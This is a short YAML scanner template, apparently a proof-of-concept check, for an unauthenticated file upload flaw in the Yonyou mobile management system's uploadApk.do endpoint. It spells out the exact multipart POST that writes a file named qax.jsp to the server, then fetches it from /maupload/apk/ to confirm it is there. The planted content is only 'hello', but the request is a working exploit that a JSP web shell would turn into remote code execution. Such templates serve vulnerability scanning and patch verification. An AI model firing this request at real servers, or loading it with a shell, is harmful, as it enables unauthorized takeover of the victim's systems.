id: 用友_移动管理系统_uploadApk.do 文件上传
info:
  name: 用友_移动管理系统_uploadApk.do 文件上传
  author: 小黑子
  severity: critical
  verified: true
  description: |
    app="用友-移动系统管理"

rules:
    r0:
        request:
            method: POST
            path: /maportal/appmanager/uploadApk.do?pk_obj=
            headers:
             Content-Type:
              multipart/form-data; boundary=----WebKitFormBoundaryvLTG6zlX0gZ8LzO3
             User-Agent:
              Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)
            body: "\
             ------WebKitFormBoundaryvLTG6zlX0gZ8LzO3\r\n\
             Content-Disposition: form-data; name=\"downloadpath\"; filename=\"qax.jsp\"\r\n\
             Content-Type: application/msword\r\n\
             \r\n\
             hello\r\n\
             ------WebKitFormBoundaryvLTG6zlX0gZ8LzO3--\r\n\
            "
        matcher:

    r1:
      request:
        method: GET
        cookie:
        headers:
          User-Agent:
            Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)
        path: /maupload/apk/qax.jsp
        matcher: res.status_code==200 and "hello" in res.text
